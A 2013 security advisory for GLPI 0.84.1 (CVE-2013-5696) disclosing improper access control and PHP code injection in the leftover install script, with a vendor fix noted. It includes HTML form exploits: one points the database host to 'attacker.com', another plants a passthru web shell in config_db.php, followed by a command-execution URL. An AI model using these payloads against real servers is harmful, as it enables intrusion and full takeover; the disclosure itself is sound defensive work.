@@ -1,0 +1,67 @@
+id: 21319
+date: 10/02/2013
+title: GLPI 0.84.1 - Multiple Vulnerabilities
+author: High-Tech Bridge
+cves: CVE-2013-5696
+
+Product: GLPI
+Vendor: INDEPNET
+Vulnerable Version(s): 0.84.1 and probably prior
+Tested Version: 0.84.1
+Advisory Publication: September 11, 2013 [without technical details]
+Vendor Notification: September 11, 2013
+Vendor Patch: September 12, 2013
+Public Disclosure: October 2, 2013
+Vulnerability Type: Improper Access Control [CWE-284],Code Injection [CWE-94]
+CVE Reference: CVE-2013-5696
+Risk Level: Critical
+CVSSv2 Base Scores: 6.4 (AV:N/AC:L/Au:N/C:N/I:P/A:P), 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )
+ 
+------------------------------------------------------------------------
+-----------------------
+ 
+Advisory Details:
+ 
+High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in GLPI, which can be exploited to bypass security restrictions and execute arbitrary PHP code with privileges of web server.
+ 
+1) Improper Access Control in GLPI
+ 
+The vulnerability exists due to insufficient access restrictions to the installation script "/install/install.php", which is present by default after application installation. A remote attacker can change applicationâ??s configuration, such as database host, forcing the application to connect to an external database and spoof information on the website, obtain access to sensitive information or simply cause a denial of service.
+ 
+Simple exploit below changes the database hostname to "attacker.com", which forces the application to connect to a malicious database controlled by the attacker:
+ 
+<form action="http://[host]/install/install.php" method="post" name="main">
+<input type="hidden" name="install" value="update_1">
+<input type="hidden" name="db_host" value="attacker.com">
+<input type="submit" id="btn">
+</form>
+ 
+2) Arbitrary PHP Code Injection in GLPI
+ 
+The vulnerability exists due to insufficient validation of user-supplied input passed to the "db_host", "db_user", "db_pass", and "databasename" HTTP POST parameters via "/install/install.php" script [that is present by default after application installation] before writing data into "/config_db.php" file. A remote attacker can inject and execute arbitrary PHP code on the vulnerable system.
+ 
+Simple exploit below injects "passthru($_GET['cmd'])" PHP code into "config_db.php" file allowing a remote attacker to execute arbitrary system command with privileges of the web server:
+ 
+<form action="http://[host]/install/install.php" method="post" name="main">
+<input type="hidden" name="install" value="update_1">
+<input type="hidden" name="db_host" value="'; } passthru($_GET['cmd']); /*">
+<input type="submit" id="btn">
+</form>
+ 
+After that attacker can access the web shell to execute system commands via the following URL:
+http://[host]/index.php?cmd=ls -la; id; pwd;
+ 
+------------------------------------------------------------------------
+-----------------------
+ 
+Solution:
+ 
+Update to GLPI 0.84.2
+ 
+More Information:
+http://www.glpi-project.org/spip.php?page=annonce&id_breve=307&lang=fr
+https://forge.indepnet.net/issues/4480
+
+#  0day.today [2023-03-24]  #
